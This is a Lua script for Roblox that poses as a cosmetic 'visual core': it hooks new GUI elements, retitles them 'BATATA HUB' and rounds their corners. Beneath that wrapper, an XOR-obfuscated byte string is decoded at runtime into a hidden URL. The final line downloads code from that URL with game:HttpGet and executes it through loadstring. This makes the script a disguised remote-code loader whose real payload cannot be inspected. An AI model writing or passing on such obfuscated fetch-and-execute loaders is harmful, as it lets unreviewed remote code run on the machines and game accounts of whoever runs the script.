
--[[ STAGE 2: VISUAL CORE ]]
local BmpV2rXMaLwpzyj7O="\175\222\213\212\204\128\138\129\249\197\238\178\240\233\025\224\018\028\004\001\014\056\006\049\045\038\044\034\087\020\094\073\074\003\127\117\113\121\104\111\098\101\151\137\151\071\143\186\190\191\178\221\178\162\217\145\210\213\200\194\184\211\244\236\242\224\021\229\194\017\008\017\228\017\024\061\014\093\095\036\034\076\084\070\124\079\083\077\124\071\105\107\149\153\155\150\128\147\154\181\174\168\182\175\172\147\136\142\138\208\187\176\177\176\237\227\242"local pKh52MSo7wnljTvHBGyMo=157 local Erg8ZaXUWj_GkdT7I=166 local sMPLO0y0SgjZ=1 local Fnvt1NNmYiePPwX9W7YjRy=5 local DBYQFL8Y6MLm5C=31 local mnUaLTS8YPxqPdWIWRo=false local i96qObRCxtObHLnNF0DFx9=bit32 and bit32.bxor if not i96qObRCxtObHLnNF0DFx9 then i96qObRCxtObHLnNF0DFx9=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local fgCQs8wNHElWjfjGM={}for oDt1I9Bd2X2LpMsMDI=1,#BmpV2rXMaLwpzyj7O do local u2mzS0MnRlIJSDjmK=string.byte(BmpV2rXMaLwpzyj7O,oDt1I9Bd2X2LpMsMDI)local pt4wAu5lre5zmiuv5M9PM=(Erg8ZaXUWj_GkdT7I+(oDt1I9Bd2X2LpMsMDI*Fnvt1NNmYiePPwX9W7YjRy)+DBYQFL8Y6MLm5C)%256 if sMPLO0y0SgjZ==0 then u2mzS0MnRlIJSDjmK=(u2mzS0MnRlIJSDjmK-pt4wAu5lre5zmiuv5M9PM)%256 fgCQs8wNHElWjfjGM[oDt1I9Bd2X2LpMsMDI]=string.char(i96qObRCxtObHLnNF0DFx9(u2mzS0MnRlIJSDjmK,pKh52MSo7wnljTvHBGyMo))else u2mzS0MnRlIJSDjmK=i96qObRCxtObHLnNF0DFx9(u2mzS0MnRlIJSDjmK,pKh52MSo7wnljTvHBGyMo)fgCQs8wNHElWjfjGM[oDt1I9Bd2X2LpMsMDI]=string.char((u2mzS0MnRlIJSDjmK-pt4wAu5lre5zmiuv5M9PM)%256)end end local UyMdjscdoCc5SfZA2kUwig=table.concat(fgCQs8wNHElWjfjGM)if mnUaLTS8YPxqPdWIWRo then UyMdjscdoCc5SfZA2kUwig=string.reverse(UyMdjscdoCc5SfZA2kUwig)end local wWFXWNEJycWt=UyMdjscdoCc5SfZA2kUwig
local HubName = "BATATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(wWFXWNEJycWt))()
